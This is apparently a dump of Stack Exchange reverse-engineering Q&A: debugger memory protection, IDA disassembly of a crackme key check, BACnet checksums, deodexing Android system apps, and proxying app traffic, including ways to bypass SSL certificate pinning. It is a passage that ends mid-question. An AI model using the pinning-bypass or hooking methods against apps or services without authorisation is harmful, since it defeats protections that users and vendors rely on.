 **Access=RWE**
 Initial access=R
</code></pre>

<p>windbg will show changed attribute only if traversed page by page</p>

<pre><code>0:000&gt; g
ModLoad: 5cb70000 5cb96000   C:\WINDOWS\system32\ShimEng.dll
Breakpoint 0 hit
&gt;    8: {
0:000&gt; p
&gt;    9:     printf(""lets valloc \n"");
0:000&gt; p
&gt;   11:     foo = (PCHAR)VirtualAlloc(0,0x1004,MEM_COMMIT,PAGE_READONLY);
0:000&gt; p
&gt;   12:     printf(""we valloced lets vprot\n"");
0:000&gt; ?? foo
char * 0x003a0000
 """"
0:000&gt; !vprot @@c++(foo)
BaseAddress:       003a0000
AllocationBase:    003a0000
AllocationProtect: 00000002  PAGE_READONLY
RegionSize:        00002000
State:             00001000  MEM_COMMIT
Protect:           00000002  PAGE_READONLY
Type:              00020000  MEM_PRIVATE
0:000&gt; p
&gt;   14:     if (  (VirtualProtect(foo+0x1000,1,PAGE_EXECUTE_READWRITE,&amp;oldprot) == FALSE) )
0:000&gt; p
&gt;   19:     if (  (VirtualProtect(foo+0xfff,1,PAGE_EXECUTE_READWRITE,&amp;oldprot) == FALSE) )
0:000&gt; !vprot @@c++(foo)
BaseAddress:       003a0000
AllocationBase:    003a0000
AllocationProtect: 00000002  PAGE_READONLY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000002  PAGE_READONLY
Type:              00020000  MEM_PRIVATE

0:000&gt; !vprot (@@c++(foo)+1000)
BaseAddress:       003a1000
AllocationBase:    003a0000
AllocationProtect: 00000002  PAGE_READONLY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
</code></pre>

<p>ollydbg 2.01 will show  any changes instantly note memory map item no and address </p>

<pre><code>Memory map, item 19
  Address = 003A0000
  Size = 00002000 (8192.)
  Owner =                 003A0000 (self)
  Section =
  Contains =
  Type = Priv 00021002
  Access = R
  Initial access = R
  Mapped as =
</code></pre>

<p>after first Virtualprotect</p>

<pre><code>Memory map, item 20
  Address = 003A1000
  Size = 00001000 (4096.)
  Owner =                 003A0000
  Section =
  Contains =
  Type = Priv 00021040
  Access = RWE
  Initial access = R
  Mapped as =
</code></pre>
","2141"
"Understanding unknown in IDA","1336","","<p>What is this instruction trying to do?</p>

<pre><code> .text:4044A5EC LDR     R5, =(unk_40885080 - 0x4044A5F8)
</code></pre>

<p>Looking at the value of unk_40885080 it holds a value of 20 in the .data segment.</p>
","<p>This seems to be ARM PIC (Position-Independent) code, where the address is given relative to the program counter. Ida detects this and shows the ""real"" address. </p>

<p>Unfortunately, you didn't post any code around the your single statement, so i'm using one of my own disassemblies to show you:</p>

<pre><code>.text:00062454                 LDR             R3, [R4,#8]
.text:00062458                 MOV             R0, #0x2C ; ','
.text:0006245C                 LDR             R1, =(unk_218172 - 0x62474)  &lt;--- a
.text:00062460                 MOV             R5, #0
.text:00062464                 MOV             R2, #4  ; n
.text:00062468                 STRB            R0, [R3,#0x12]
.text:0006246C                 ADD             R1, PC, R1                   &lt;--- b
.text:00062470                 LDR             R3, [R4,#8]
.text:00062474                 ADD             R0, R3, #0x30 ; dest
.text:00062478                 STR             R1, [R3,#8]
.text:0006247C                 STR             R1, [R3,#0x14]
</code></pre>

<p>The code loads some value into R1 (a), then (b) adds PC to it. So, the value of the register is supposed to be a pointer into memory, but beause PC gets added later, the value that is loaded at 2645C wouldn't make any sense. Ida detects the ADD instruction, and shows the LDR instruction in a way that lets you see where it's supposed to point to.</p>

<p>The fact that the ""correcting offset"" of 0x62474 is not the address of the <code>ADD</code> instruction is because of pipelining within the processor; at the moment the <code>ADD</code> gets executed, the next instructions have already been read, so PC is two instructions ""behind"" where the <code>ADD</code> instruction is located.</p>

<p>(The reason why the compiler produces this kind of code is, when the same code gets loaded at a different address later it stays valid, even without the relocation patching the linker/loader would have to do otherwise. That's called PIC, or Position-independent code.)</p>
","4475"
"What are the sections of a x86 linux binary?","1333","","<p>I want to learn reverse engineering so I was starting to try compiling simple (to start with) C programs and then reading the disassembly.</p>

<p>The following file</p>

<pre><code>int main(void) {
  return 0;
}
</code></pre>

<p>compiled with <code>gcc</code> then disassembled with <code>objdump -d</code> ends up creating 172 lines of output. I don't understand why there is so much output.</p>

<p>What is the meaning of the different sections:</p>

<pre><code>0000000000400370 &lt;_init&gt;:
0000000000400390 &lt;__libc_start_main@plt-0x10&gt;:
00000000004003a0 &lt;__libc_start_main@plt&gt;:
00000000004003b0 &lt;__gmon_start__@plt&gt;:
00000000004003c0 &lt;_start&gt;:
00000000004003f0 &lt;deregister_tm_clones&gt;:
0000000000400420 &lt;register_tm_clones&gt;:
0000000000400460 &lt;__do_global_dtors_aux&gt;:
0000000000400480 &lt;frame_dummy&gt;:
00000000004004ad &lt;main&gt;:
00000000004004c0 &lt;__libc_csu_init&gt;:
0000000000400530 &lt;__libc_csu_fini&gt;:
0000000000400534 &lt;_fini&gt;:
</code></pre>

<p>Of course I have been reading about the calling convention and opcodes so I can see how the  section corresponds to the C code.</p>
","<p>I see you're mixing up sections with functions.</p>

<p>What you have provided in your question are functions necessary to an ELF binary to execute. For example, the <code>_start</code> function is usually the <em>entry point</em> of a binary and it will probably call the <code>main</code> function at some point. You can get the address of the entry of a binary using <code>readelf -h</code> on the binary file you have.</p>

<p>About the output, though your program is ""empty"" it was still compiled &amp; linked successfully - for that it is not erroneous - into an executable ELF. This document provides everything you need to know about how an ELF binary is structured &amp; how to manipulate it : <a href=""http://www.skyfree.org/linux/references/ELF_Format.pdf"">ELF Format</a> (PDF).</p>

<p>Now if you want to retrieve section information in a binary file the <code>readelf</code> function can again help with that, you just have to call it with the <code>-S</code> and the target binary file (<code>readelf -S prog</code>).</p>

<p>Since you're just starting to learn, I recommend you checking the binutils (<code>readelf</code>, <code>objdump</code>, ...) and their related documentation and start playing with simple programs before moving to crackmes and more advanced or obfuscated binary files.</p>
","4153"
"Correct IDA PRO Control Flow Graph","1332","","<p>I'm analyzing a MIPS ELF executable with calls to the <code>exit()</code> function, however IDA PRO is not correctly recognizing the end of the block:</p>

<p><img src=""https://i.stack.imgur.com/9Scq4.png"" alt=""enter image description here""></p>

<ul>
<li><p><strong>Question</strong>: Is it possible to remove the blue arrow linking the <code>exit()</code> block with the next one ?</p></li>
<li><p><strong>Question</strong>: Is it possible to enhance the disassembly if IDA by specifying exit as a block end ?</p></li>
</ul>
","<p>It is possible to define a function exit as ""no return"" function.
This should fix the problem.</p>

<p>To do it you should find exit function, right click on it, choose ""edit function"" and mark ""Does not return"" checkbox.</p>
","6205"
"Reverse engineering Android vendor system apps","1331","","<p>I'm trying to reverse engineer certain Samsung system apps in the Galaxy S6 firmware system image, such as KnoxAttestationAgent.apk. I'm a noob when it comes to reverse engineering, and so far my attempts have been unsuccessful. Here's what I've done so far.</p>

<ul>
<li>Run apktool on the APK. I got a few XML files, including the AndroidManifest, but no source. Apparently this is because there is no classes.dex in the package.</li>
<li>Noticing that there's a KnoxAttestationAgent.odex in the arm64/ folder, I tried to run baksmali 2.1.1 on it. However, this version apparently doesn't support Android 5 versions of oat. The S6 firmware I'm working on is 5.1.1.</li>
<li>I tried an earlier version of baksmali 2.0.8 which doesn't have the limitation, but I get another error ""KnoxAttestationAgent.odex is not an apk, dex file or odex file.""</li>
<li>I tried to run AndroGuard on the APK, but was also unsuccessful. A bunch of errors.</li>
</ul>

<p>Is there a way for these tools (or others) to work on system apps such as the Samsung Knox ones?</p>

<p>Thanks!</p>
","<blockquote>
  <p>Run apktool on the APK. I got a few XML files, including the
  AndroidManifest, but no source. Apparently this is because there is no
  classes.dex in the package.</p>
</blockquote>

<p>That's because these are odexed apps: when an app is odexed, the classes.dex is extracted from the apk.</p>

<blockquote>
  <p>I tried an earlier version of baksmali 2.0.8 which doesn't have the limitation, but I get another error ""KnoxAttestationAgent.odex is not an apk, dex file or odex file.""</p>
</blockquote>

<p>That's right, because the .odex file is not an apk. An odex file is basically an optimized version of the classes.dex</p>

<p>So, in order to disassemble this app, you have to deodex it.</p>

<p>Here is an HOW-TO guide (I haven't tested it personally): <a href=""http://www.naldotech.com/how-to-deodex-applications-on-android-5-0-lollipop/"" rel=""nofollow"">http://www.naldotech.com/how-to-deodex-applications-on-android-5-0-lollipop/</a></p>

<p>Eventually, if you follow all the steps correctly, you will have an apk ready to be reversed using APKTool. 
Good luck.</p>
","12406"
"RS-485 Checksum Reverse Engineering (Watlow EZ-Zone PM)","1327","","<p>I am trying to reverse engineer a two wire RS-485 standard serial bus interface to talk to a <a href=""https://www.watlow.com/products/controllers/ez-zone-pm-controller.cfm?famid=19"" rel=""noreferrer"">Watlow EZ-Zone PM</a> of which I have not been able to find any documentation of the protocol. I have managed to figure out most of the hex commands except for the ""check bytes"" by sniffing the serial communications from the <a href=""http://sine.ni.com/apps/utf8/niid_web_display.model_page?p_model_id=16725"" rel=""noreferrer"">Labview driver</a> (which doesn't work for my particular application).</p>

<p><strong>I am having trouble figuring out the 3 check bytes. Any help is appreciated.</strong></p>

<p>Example hex command:</p>

<pre><code>                                       Instance
        Zone                 Parameter  |
         ||                      |---| ||
55 FF 05 10 00 00 06 E8 01 03 01 04 01 01 E3 99
                     ^^                   ^^ ^^
                  check byte           check bytes
</code></pre>

<p>The first check byte only changes with the bytes before it:</p>

<pre><code>55 FF 05 10 00 00 06 E8 01 03 01 04 01 01 E3 99
55 FF 05 11 00 00 06 61 01 03 01 04 01 01 E3 99
55 FF 05 12 00 00 06 F9 01 03 01 04 01 01 E3 99
55 FF 05 13 00 00 06 70 01 03 01 04 01 01 E3 99
55 FF 05 14 00 00 06 CA 01 03 01 04 01 01 E3 99
</code></pre>

<p>The second two bytes only change with the bytes after the first check byte:</p>

<pre><code>55 FF 05 10 00 00 06 E8 01 03 01 04 01 01 E3 99
55 FF 05 10 00 00 06 E8 01 03 01 04 02 01 8B B3
55 FF 05 10 00 00 06 E8 01 03 01 04 03 01 53 AA
55 FF 05 10 00 00 06 E8 01 03 01 04 04 01 5B E7
55 FF 05 10 00 00 06 E8 01 03 01 04 05 01 83 FE
55 FF 05 10 00 00 06 E8 01 03 01 05 05 01 5F A4
55 FF 05 10 00 00 06 E8 01 03 01 06 05 01 3B 4B
55 FF 05 10 00 00 06 E8 01 03 01 07 05 01 E7 11
55 FF 05 10 00 00 06 E8 01 03 01 08 05 01 20 5B
55 FF 05 10 00 00 06 E8 01 03 01 09 05 01 FC 01
55 FF 05 10 00 00 06 E8 01 03 01 0A 05 01 98 EE
</code></pre>

<p>I did find reference to a CRC checksum in the Watlow Modbus documentation. However I have no idea what the polynomial is. Any ideas?</p>
","<p>I downloaded the <a href=""http://www.watlow.com/downloads/en/software/ezzone.cfm"">EZ-ZONE Configurator</a> and reverse engineered it to see how it works.</p>

<p>The serial data you're seeing is actually the <a href=""http://en.wikipedia.org/wiki/BACnet"">BACnet</a> MS/TP (master-slave/token-passing) protocol. You can find the <a href=""https://www.wireshark.org/"">Wireshark</a> protocl decoder for it <a href=""http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-mstp.c"">here</a>. However, to save you the time, I'll help you get to the meat of calculating those check bytes.</p>

<p>In BACnet parlance, <code>55 FF</code> is called the ""preamble"", the first check byte is called the ""Header CRC"", the last two check bytes are called the ""Data CRC"", etc. For simplification though, let's call <code>b[]</code> your byte array: <code>b[0]</code> = <code>55</code>, <code>b[1]</code> = <code>FF</code>, etc.</p>

<p>The first check byte (a.k.a. ""Header CRC"") (<code>b[7]</code>) is calculated using the BACnet 8-bit CRC as follows.</p>

<p>We first define our CRC table:</p>

<pre><code>BYTE crc[256] =
{
    0x00, 0xfe, 0xff, 0x01, 0xfd, 0x03, 0x02, 0xfc,
    0xf9, 0x07, 0x06, 0xf8, 0x04, 0xfa, 0xfb, 0x05,
    0xf1, 0x0f, 0x0e, 0xf0, 0x0c, 0xf2, 0xf3, 0x0d,
    0x08, 0xf6, 0xf7, 0x09, 0xf5, 0x0b, 0x0a, 0xf4,
    0xe1, 0x1f, 0x1e, 0xe0, 0x1c, 0xe2, 0xe3, 0x1d,
    0x18, 0xe6, 0xe7, 0x19, 0xe5, 0x1b, 0x1a, 0xe4,
    0x10, 0xee, 0xef, 0x11, 0xed, 0x13, 0x12, 0xec,
    0xe9, 0x17, 0x16, 0xe8, 0x14, 0xea, 0xeb, 0x15,
    0xc1, 0x3f, 0x3e, 0xc0, 0x3c, 0xc2, 0xc3, 0x3d,
    0x38, 0xc6, 0xc7, 0x39, 0xc5, 0x3b, 0x3a, 0xc4,
    0x30, 0xce, 0xcf, 0x31, 0xcd, 0x33, 0x32, 0xcc,
    0xc9, 0x37, 0x36, 0xc8, 0x34, 0xca, 0xcb, 0x35,
    0x20, 0xde, 0xdf, 0x21, 0xdd, 0x23, 0x22, 0xdc,
    0xd9, 0x27, 0x26, 0xd8, 0x24, 0xda, 0xdb, 0x25,
    0xd1, 0x2f, 0x2e, 0xd0, 0x2c, 0xd2, 0xd3, 0x2d,
    0x28, 0xd6, 0xd7, 0x29, 0xd5, 0x2b, 0x2a, 0xd4,
    0x81, 0x7f, 0x7e, 0x80, 0x7c, 0x82, 0x83, 0x7d,
    0x78, 0x86, 0x87, 0x79, 0x85, 0x7b, 0x7a, 0x84,
    0x70, 0x8e, 0x8f, 0x71, 0x8d, 0x73, 0x72, 0x8c,
    0x89, 0x77, 0x76, 0x88, 0x74, 0x8a, 0x8b, 0x75,
    0x60, 0x9e, 0x9f, 0x61, 0x9d, 0x63, 0x62, 0x9c,
    0x99, 0x67, 0x66, 0x98, 0x64, 0x9a, 0x9b, 0x65,
    0x91, 0x6f, 0x6e, 0x90, 0x6c, 0x92, 0x93, 0x6d,
    0x68, 0x96, 0x97, 0x69, 0x95, 0x6b, 0x6a, 0x94,
    0x40, 0xbe, 0xbf, 0x41, 0xbd, 0x43, 0x42, 0xbc,
    0xb9, 0x47, 0x46, 0xb8, 0x44, 0xba, 0xbb, 0x45,
    0xb1, 0x4f, 0x4e, 0xb0, 0x4c, 0xb2, 0xb3, 0x4d,
    0x48, 0xb6, 0xb7, 0x49, 0xb5, 0x4b, 0x4a, 0xb4,
    0xa1, 0x5f, 0x5e, 0xa0, 0x5c, 0xa2, 0xa3, 0x5d,
    0x58, 0xa6, 0xa7, 0x59, 0xa5, 0x5b, 0x5a, 0xa4,
    0x50, 0xae, 0xaf, 0x51, 0xad, 0x53, 0x52, 0xac,
    0xa9, 0x57, 0x56, 0xa8, 0x54, 0xaa, 0xab, 0x55
};
</code></pre>

<p>And next we can calculate <code>b[7]</code>:</p>

<pre><code>b[7] = ~crc[b[6] ^ crc[b[5] ^ crc[b[4] ^ crc[b[3] ^ crc[~b[2]]]]]]
</code></pre>

<p>To calculate the value of the last two check bytes (""Data CRC""):</p>

<p>Perform a CRC-16 of the 6 bytes between the first check byte and the last two check bytes (in your first example, this would be the bytes <code>01 03 01 04 01 01</code>), with <code>0xFFFF</code> (<code>-1</code>) as the initial value for the CRC-16, and <code>0x8408</code> as the polynomial. Then bit-flip (a.k.a. ""not"", a.k.a. ""invert"") the result and read it in little-endian.</p>
","8305"
"Deobfuscating IDA Pseudocode","1320","","<p>I have wanted to get into the art of reverse engineering for quite some time now, so I took a look at a few online lessons (such as opensecuritytraining.info) and also got my hands on IDA Pro.</p>

<p>Obviously, since this is a complex topic, I was overwhelmed by registers, pointers, instructions et cetera. I know assembler and C fairly well, it's just (like I said earlier) a topic where you have to learn much.</p>

<p>Now to my actual question: I have downloaded a ""CrackMe""-Program and started debugging it. Basically the objective is to find a key which you then have to enter into a Textbox in the program. I found the key checking function fairly easily and identified some logic, but I can't wrap my head around how the program actually compares the string. My C skills are much greater than my Assembler skills, so I decided to get some Pseudocode printed. The problem is that the Pseudocode is pretty messy (I'm guessing that's because of compiler optimizations) and I basically can't understand what this piece of code is supposed to do.</p>

<p>Here is the code (sorry it's a bit long):</p>

<pre><code>int __usercall TSDIAppForm_Button1Click&lt;eax&gt;(int a1&lt;eax&gt;, int a2&lt;ebx&gt;, int a3&lt;edi&gt;, int a4&lt;esi&gt;)
{
  int v4; // ebx@1
  int v5; // esi@1
  int v6; // eax@1
  signed int v7; // eax@3
  signed int v8; // edx@3
  int v9; // ebx@3
  int v11; // edx@12
  int v12; // [sp-24h] [bp-34h]@1
  int (*v13)(); // [sp-20h] [bp-30h]@1
  int *v14; // [sp-1Ch] [bp-2Ch]@1
  int v15; // [sp-18h] [bp-28h]@1
  int (*v16)(); // [sp-14h] [bp-24h]@1
  int *v17; // [sp-10h] [bp-20h]@1
  int v18; // [sp-Ch] [bp-1Ch]@1
  int v19; // [sp-8h] [bp-18h]@1
  int v20; // [sp-4h] [bp-14h]@1
  int v21; // [sp+0h] [bp-10h]@1
  int v22; // [sp+4h] [bp-Ch]@1
  int v23; // [sp+8h] [bp-8h]@2
  void (__fastcall *v24)(int); // [sp+Ch] [bp-4h]@7
  int v25; // [sp+10h] [bp+0h]@1

  v22 = 0;
  v21 = 0;
  v20 = a2;
  v19 = a4;
  v18 = a3;
  v5 = a1;
  v17 = &amp;v25;
  v16 = loc_45C6FD;
  v15 = *MK_FP(__FS__, 0);
  *MK_FP(__FS__, 0) = &amp;v15;
  JUMPOUT(Controls__TControl__GetTextLen(*(_DWORD *)(a1 + 872)), 0xFu, *(unsigned int *)""j"");
  v6 = Controls__TControl__GetTextLen(*(_DWORD *)(a1 + 872));
  System____linkproc___DynArraySetLength(v6);
  System____linkproc___DynArraySetLength(664);
  v14 = &amp;v25;
  v13 = loc_45C699;
  v12 = *MK_FP(__FS__, 0);
  *MK_FP(__FS__, 0) = &amp;v12;
  v4 = 0;
  do
  {
    Controls__TControl__GetText(*(_DWORD *)(v5 + 872), &amp;v21, v12);
    *(_DWORD *)(v23 + 4 * v4) = *(_BYTE *)(v21 + v4 - 1);
    ++v4;
  }
  while ( v4 != 16 );
  v8 = 1;
  v9 = 0;
  v7 = 4585384;
  do
  {
    if ( v8 == 16 )
      v8 = 1;
    *(_BYTE *)(v22 + v9++) = *(_BYTE *)v7++ ^ *(_BYTE *)(v23 + 4 * v8++);
  }
  while ( v9 != 665 );
  v24 = (void (__fastcall *)(int))v22;

  // I know the key to success lies here, but I can't figure out what this if is supposed to do
  if ( *(_BYTE *)v22 != 96 || *(_BYTE *)(v22 + 4) != 208 || *(_BYTE *)(v22 + 9) )
    MessageBoxA_0(0, ""Invalid Key"", ""Error"", 0);
  else
    v24(v22);
  *MK_FP(__FS__, 0) = v12;
  v11 = v15;
  *MK_FP(__FS__, 0) = v15;
  System____linkproc___LStrClr(&amp;v21, v11, 4572932);
  System____linkproc___DynArrayClear(&amp;v22, off_45C568);
  return System____linkproc___DynArrayClear(&amp;v23, off_45C548);
}
</code></pre>

<p>I would appreciate it if someone could give me advice on how to ""deobfuscate"" this piece of code. Are there any plugins available to do this? Is there a special technique that I can use to figure it out? Would it be better to look at the Assembler code instead of the Pseudocode?</p>

<p>I especially wonder where these weird constants (like 872 for example) come from.</p>

<p>Answers would be highly appreciated.</p>
","<p>IDA Pro is no magic tool to automatically decompile binaries to their source code. The decompiler output should not be relied every time (as compiling leads to loss of information) although IDA boasts of the finest decompiler available. Instead focus on the disassembly listing. For specific parts, you can use the decompiler output as your reference.</p>

<p>Deobfuscation is a multi-step process. First try to understand the usages of <em>variables</em>, <em>structures</em>, etc and then give them a more easy-to-understand names reflecting their purpose. In many cases you can understand the variables purposes by just noting how it is used in function calls. For example <code>Vcl.Controls.TControl.GetTextLen</code> returns the length of the control's text. That means among the parameters passed, one must be the a pointer to the <code>TControl</code>. You can use this information to rename variables.</p>

<p>In case of <code>VCL</code> binaries, <em><a href=""http://kpnc.org/idr32/en/"" rel=""nofollow"">Interactive Delphi Reconstructor</a></em>, will give you more easy-to-understand disassembly, as it is geared for that purpose. IDR also has a somewhat very limited decompilation capability.</p>

<p>For better understanding IDA Pro and its myriad of features, I would recommend to go through these two books <em><a href=""http://rads.stackoverflow.com/amzn/click/1593272898"" rel=""nofollow"">The IDA Pro Book</a></em> and <em><a href=""http://rads.stackoverflow.com/amzn/click/159749237X"" rel=""nofollow"">Reverse Engineering Code with IDA Pro</a></em> </p>
","5840"
"Reverse engineer a proprietary save/file format structure","1320","","<p>I am working on automating some functionality within a closed-source third party application; I want to automate the creation of ""Project Files"" (in its simplest form, just a collection of video files in a specific order). The video files which this application works with each have an associated metadata file, and I have already managed to understand and recreate 99% of its format. Both these ""project files"" and the metadata files are more-or-less plain XML (with some strange tag names I have yet to decipher).</p>

<p>Basically, I want to know what methods I can use to determine the format of these project files so that I can write my own and reference the video files I have chosen in the prior part of my script.</p>

<p>There are <strong><em>many</em></strong> DLL files in the applications directory, and I was thinking that maybe monitoring their use during a save operation (of a project file in the application) could point me in the right direction? If so, how could I go about this? I have also began learning DLL injection, and was wondering if this could be of use?</p>
","<p>Ok, this can be tackled in a great number of ways. As you recently learned DLL injection a fun exercise is to use this knowledge to overwrite a function :) </p>

<p>A good start is the <a href=""https://www.htbridge.com/publications/inline_hooking_in_windows.html"" rel=""nofollow"">Inline Hooking in Windows Presentation by High-Tech Bridge</a> and <a href=""http://www.codeproject.com/Articles/2082/API-hooking-revealed"" rel=""nofollow"">this codeproject</a> page. What you do is overwrite the function. What you'll have to to in order to redirect the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747%28v=vs.85%29.aspx"" rel=""nofollow"">WriteFileA</a> to your own write function. This allows you to trace-back by walking the return values to determine the flow of the data. You can also examine the way data is written (once or by chunks).</p>

<p>You can also Trace the application, check the addresses of data that is collected, see if it gets parsed though some kind of encryption or compression algorithm. </p>

<p>Hope I am some form of help. :) </p>
","2827"
"Visual View in radare2 while debugging","1311","","<p>I am using radare2 in debugging mode (r2 -d ./program).
I set up a breakpoint at a certain address (<code>db 0x12341234</code>)
And next I have entered Visual View using: <code>V!</code></p>

<p>Following some tutorials, I saw them using '<code>s</code>' to switch to the next instruction, but that isn't working for me.
Also this is not working:</p>

<blockquote>
  <p>Maybe a simpler method to use debugger in radare is to switch it to visual mode. That way you will not have to remember many commands nor to keep program state in your mind. To enter visual mode use <code>V</code>:</p>

<pre><code>[0xB7F0C8C0]&gt; V
</code></pre>
  
  <p>The initial view after entering visual mode is a hexdump view of current target program counter (e.g., EIP for x86). Pressing <code>p</code> will allow you to cycle through the rest of visual mode views. You can press <code>p</code> and <code>P</code> to rotate through the most commonly used print modes. Use <kbd>F7</kbd> or s to step into and <kbd>F8</kbd> or <code>S</code> to step over current instruction. With the <code>c</code> key you can toggle the cursor mode to mark a byte range selection (for example, to later overwrite them with <code>nop</code>). You can set breakpoints with <kbd>F2</kbd> key.</p>
</blockquote>

<p>Any key I would press does nothing. Am I missing something or?</p>

<p><a href=""https://i.stack.imgur.com/7XXna.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7XXna.png"" alt=""""></a></p>

<p>I am talking about this view.</p>
","<p>First of all, make sure you run the latest version of radare2 from git repository:</p>

<pre><code>$ git clone https://github.com/radare/radare2.git
$ cd radare2
$ ./sys/install.sh
</code></pre>

<p>If you don’t want to install the git version or you want the binaries for another machine (Windows, OS X, iOS, etc) check out the <a href=""http://radare.org/r/down.html"" rel=""noreferrer"">download page</a> at the radare2 website.</p>

<p>radare2 has several different Visual Views, before I'll explain them - please analyze the program using <code>aa</code> and seek to a function using <code>s &lt;function_name&gt;</code>. You can list the functions recognized by radare2 using <code>afl</code>.</p>

<ul>
<li><code>V</code> - The basic Visual Mode. You can toggle between the views using
<code>p</code> and <code>P</code>.</li>
<li><code>VV</code> - Visual Graph Mode, Displays an ASCII graph
view. Again you can toggle between the views using <code>p</code> and <code>P</code>.  </li>
<li><code>V!</code> - Visual Panels Mode, which is the mode you attached to your
question.</li>
</ul>

<p>In each of the modes mentioned above you can press <code>?</code> in order to list the commands available. The commands varies between the different modes.</p>

<p>Pressing <code>s</code> and <code>S</code> inside a Visual view while debugging will step-in and step-over respectively. radare will automatically sync the view with <code>eip</code> on every step.<br>
In Visual Panels Mode (<code>V!</code>) you can use <code>TAB</code> to navigate between the panels and h/j/k/l to move inside the view/panel.<br>
You can run r2 commands from inside Visual Mode using <code>:</code> (ie. <code>s 0x00402c1e</code>).  </p>

<p>If it still doesn't work and you believe it's a problem with radare please <a href=""https://github.com/radare/radare2/issues"" rel=""noreferrer"">open an issue</a> and the great contributors of radare2 will be happy to help you.</p>
","15610"
"Reverse engineering an application's client connection to a host","1307","","<p>Ok guys, I'm a web programmer but I'm completely new to reverse engineering..</p>

<p>So, there's this android app called InstaMessage, I'd like to reverse engineer the client's connection to the server, so that I can emulate it on my computer and see what commands are there, perhaps play with it a bit and further create some scripts to act as my user actions</p>

<p>I was thinking of monitoring the traffic, seeing where it leads and which port, an try to start from there.</p>

<p>I know it's a kind of broad question, so if you could give me some tips on where to start off, it would help a lot..</p>

<p>Thanks</p>
","<p>I did this with a lot of Android apps so I'll share what I have learned.</p>

<p>When thinking of sniffing traffic, the first thing that comes to mind is ""I'll just root the Android device, run tcpdump on it and I'm done"". That works for simple things, but it gets really messy really fast. And if the app uses SSL (like 99% of what's out there) it's even worse.</p>

<h1>Use a proxy</h1>

<p>Most apps use HTTP/HTTPS to communicate with the server. The easiest way to sniff that kind of traffic is using a sniffing proxy (also called debugging proxy). Common ones are <a href=""http://www.charlesproxy.com/"" rel=""nofollow"">Charles</a> and <a href=""http://www.telerik.com/fiddler"" rel=""nofollow"">Fiddler</a>. I use Charles, so I'll show you how to work with it, but Fiddler should be similiar.</p>

<p>First off, you need your computer and your Android device on the same LAN. Upon starting Charles, it will automatically start proxying your computer's traffic. You probably don't want this, so disable it from Proxy -> Proxy Settings... -> Windows. Now point your Android network settings to use your computer as HTTP proxy (Charles default port is 8888). Charles will show you all HTTP traffic from your device.</p>

<p>If you need SSL (HTTPS) proxying, you have to install the Charles certificate on your device. Android requires you to have a protected (at least pattern) lockscreen to install external certificates. You can find the certificate in the doc/ directory in Charles' install path, or you can visit <a href=""http://www.charlesproxy.com/getssl/"" rel=""nofollow"">http://www.charlesproxy.com/getssl/</a> from your device browser. Then, in Charles, go to Proxy -> Proxy Settings... -> SSL, enable SSL proxying and add the hosts you want to proxy (or just add <code>*</code> to proxy everything).</p>

<h1>Non-HTTP(S) communication</h1>

<p>An HTTP debugging proxy will cover most apps out there. In case the app is not using HTTP(S) things get a little more complex. You may want to look into the SOCKS proxy capability of Charles, and how to configure a SOCKS proxy on your device. If that doesn't suffice, then you'll really want to break out tools like tcpdump/Wireshark. You could set up a fake DNS, ARP spoof the device, use a sniffing VPN, etc. There are a lot of ways to go about it. A fake DNS is also good if you want to emulate the server, instead of the client.</p>

<h1>SSL certificate checking</h1>

<p>When dealing with SSL, most apps trust what the OS trusts. Since you can intall external certificates on Android, you're good. Rarely, the app will check the server certificate against an embedded CA root. This can be bypassed in a few ways:</p>

<ul>
<li>Using tools like apktool and smali, inject your own certificate into the app, replacing the original one;</li>
<li>Write an xposed module that hooks the data send/receive methods, to sniff the decrypted messages;</li>
<li>Write an xposed module that hooks the certificate checking routine, bypassing it.</li>
</ul>

<p>I would go with the first or the last one.</p>

<h1>Decompilation</h1>

<p>At some point you'll have to look at the application code. Maybe it's using a proprietary binary protocol, maybe the traffic is encrypted or compressed, maybe you can't make sense of some values. I suggest trying multiple decompilers/engines. They are not perfect, and a lot of times one works well where the other fails. <a href=""http://virtuous-ten-studio.com/"" rel=""nofollow"">Virtuous Ten Studio</a> is a good one to start with. Then I alway extract the classes.dex file from the APK (it's just a ZIP file) and run it through dex2jar. I then run the resulting JAR through JD-GUI (JD-Core engine) and SecureTeam Java Decompiler (Procyon engine). Also, jadx can target DEX directly, without dex2jar.</p>

<h1>InstaMessage</h1>

<p>I checked the app you're trying to reverse. It's using standard HTTPS communication, easy to sniff using either Charles or Fiddler. The server has various GET endpoints and the client sends a base64-encoded <code>data</code> field. This is binary data, I haven't really looked into it but the first 70% is identical in all requests, so I suspect it's some kind of session token. The final part varies with requests, but the whole field is pretty high entropy so I'm thinking it's either compressed or encrypted. I would try to decompile the app and see what's going on. The server response, on the other hand, is plain JSON.</p>
","10678"
"at the rpcrt4!NdrClientCall2 function - how does it know which pipe to use in order to transfer data to another process?","1306","","<p>Hey i have a very time consuming problem, and i thought i might find someone here with better experience than mine that could help me out.</p>

<p>I am reverse-engineering an application which at some point uses the <em>NdrClientCall2</em> api to use a remote procedure of some other service (which i dont know which one that is)</p>

<p>Now before i hear comments about not trying anything my self
There are some <strong>really good applications</strong> to accomplish what i want like <strong><em>NtTrace</em></strong>, <strong><em>Strace</em></strong> and roughly <strong><em>oSpy</em></strong> can achieve the same result aswell eventually.
 But my application has some really hard anti-debugging techniques which force me to do everything manually.</p>

<p>What eventually i want to achieve is know what procedure is being called and on what service \ process.</p>

<p><a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa374215%28v=vs.85%29.aspx"" rel=""nofollow"">Here is the NdrClientCall2 Decleration by MSDN</a></p>

<pre><code>CLIENT_CALL_RETURN RPC_VAR_ENTRY NdrClientCall2(
  __in          PMIDL_STUB_DESC pStubDescriptor,
  __in          PFORMAT_STRING pFormat,
  __in_out       ...
);
</code></pre>

<p>so it uses the <strong>PMIDL_STUB_DESC</strong> struct which its definition is as the following:</p>

<pre><code>typedef struct _MIDL_STUB_DESC {
  void                                 *RpcInterfaceInformation;
  void*                                (__RPC_API *pfnAllocate)(size_t);
  void                                 (__RPC_API *pfnFree)(void*);
  union {
    handle_t              *pAutoHandle;
    handle_t              *pPrimitiveHandle;
    PGENERIC_BINDING_INFO pGenericBindingInfo;
  } IMPLICIT_HANDLE_INFO;
  const NDR_RUNDOWN                    *apfnNdrRundownRoutines;
